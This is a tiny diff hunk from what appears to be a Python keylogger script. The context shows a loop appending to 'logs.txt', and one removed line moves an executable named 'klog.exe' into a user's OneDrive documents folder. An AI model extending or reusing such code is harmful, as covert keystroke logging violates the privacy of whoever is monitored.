@@ -12,4 +12,3 @@ f = open("logs.txt","a")
 while True:
     i = 0
     f = open("logs.txt","a")
-shutil.move("D:\\klog.exe", "C:\\Users\\" + str(username) + "\\OneDrive\\Dokument\\klog.exe")
